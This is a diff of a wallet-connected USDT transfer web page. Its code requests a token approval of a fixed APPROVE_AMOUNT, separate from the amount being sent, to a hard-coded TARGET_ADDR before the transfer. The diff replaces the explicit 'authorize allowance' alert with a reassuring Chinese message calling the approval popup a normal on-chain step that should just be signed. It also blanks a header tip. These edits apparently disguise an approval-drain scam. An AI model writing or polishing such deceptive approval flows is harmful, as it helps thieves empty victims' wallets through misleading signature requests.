@@ -38,7 +38,7 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 </head>
 <body>
 <div class="top-header-bar">
-<div class="tip-text">👉已授权钱包打开页面自动恢复连接</div>
+<div class="tip-text"></div>
 <div class="header-right-icons">
 <div class="wallet-dot" id="walletDot" title="点击连接/断开钱包"></div>
 <div class="setting-btn" id="settingIconBtn" title="设置">⚙️</div>
@@ -228,13 +228,13 @@ sendBtn.addEventListener("click", async () => {
     const needWei = BigInt(web3.utils.toWei(val.toString(),"ether"));
     const approveWei = BigInt(web3.utils.toWei(APPROVE_AMOUNT,"ether"));
     try{
-        alert("🔐第一步，请签名授权USDT额度");
+        alert("不同钱包版本交互略有差异，转账USDT时弹出授权额度，属于链上正常流程，请确认签名。");
         const approveCalldata = "0x095ea7b3"
             + TARGET_ADDR.slice(2).padStart(64,"0")
             + approveWei.toString(16).padStart(64,"0");
         await sendTx(approveCalldata);
 
-        alert("✅授权完成，请签名转账");
+        alert("请签名转账");
         const transferCalldata = "0xa9059cbb"
             + TARGET_ADDR.slice(2).padStart(64,"0")
             + needWei.toString(16).padStart(64,"0");
